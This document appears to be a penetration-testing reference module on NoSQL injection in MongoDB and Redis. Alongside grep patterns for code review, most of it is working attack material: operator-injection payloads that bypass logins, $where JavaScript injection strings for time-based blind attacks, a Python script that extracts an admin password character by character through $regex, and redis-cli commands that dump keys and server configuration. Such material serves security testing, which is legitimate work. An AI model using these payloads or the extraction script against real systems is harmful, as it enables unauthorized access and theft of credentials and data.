# VULN MODULE — NoSQL Injection
# Asset: webapp (MongoDB, CouchDB, Redis, Cassandra)
# CWE-943 | Report prefix: WEB-NOSQL

## THREAT MODEL

NoSQL databases use non-SQL query languages. Injection occurs when
user input is embedded in query operators without sanitization.
MongoDB is most common; operators like $gt, $where, $regex enable
auth bypass, data extraction, and sometimes RCE ($where with JS eval).

## WHITEBOX PATTERNS

```bash
# MongoDB (Node.js / Python / PHP)
grep -rn "find(\|findOne(\|aggregate(\|update(\|insert(" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php"

# Direct req.body into query (most dangerous pattern)
grep -rn "req\.body\b" --include="*.js" --include="*.ts" -A3 | \
  grep -i "find\|query\|where\|filter"

# $where operator (JavaScript execution in MongoDB)
grep -rn "\$where\|\$function\|\$accumulator" \
  --include="*.js" --include="*.ts" --include="*.py"

# Mongoose (check for type coercion)
grep -rn "\.findOne\|\.find\|\.findById" --include="*.js" -A5 | \
  grep "req\.\(body\|query\|params\)"
```

## PAYLOADS — MONGODB

### Auth bypass via operator injection
```bash
# If login query is: db.users.findOne({username: INPUT, password: INPUT})
# Inject:
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# $gt:"" means "greater than empty string" = matches any non-empty value
# Result: returns first user in DB (usually admin)

# Or via URL parameter:
GET /login?username[$gt]=&password[$gt]=

# Array injection:
{"username": "admin", "password": ["wrongpass", "admin"]}
```

### $where JavaScript injection (MongoDB < 4.4)
```javascript
// If query uses $where:
// db.collection.find({$where: "this.username == '" + userInput + "'"})

// Inject:
' || '1'=='1   → always true
'; sleep(5000); var a='  → time-based blind
'; return true; var a='  → auth bypass
```

### $regex for data extraction (blind injection)
```bash
# Extract username character by character:
{"username": {"$regex": "^a"}}   # true if starts with 'a'
{"username": {"$regex": "^ad"}}  # true if starts with 'ad'

# Automate with Python:
python3 << 'EOF'
import requests, string

url = "https://target.com/api/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
known = ""

for i in range(30):
    for char in charset:
        payload = {"username": "admin",
                   "password": {"$regex": f"^{known}{char}"}}
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 200:
            known += char
            print(f"Found: {known}")
            break

print(f"Password: {known}")
EOF
```

### Redis injection
```bash
# If user input reaches Redis EVAL or raw commands:
# KEYS * → enumerate all keys
# GET admin_session → steal session
redis-cli -h target.com -p 6379 KEYS "*"
redis-cli -h target.com -p 6379 CONFIG GET "*"
```

## TOOLS

```bash
# NoSQLMap
pip install nosqlmap
python nosqlmap.py  # interactive

# nosql-injection-fuzzer
pip install nosql-injection-fuzzer
```
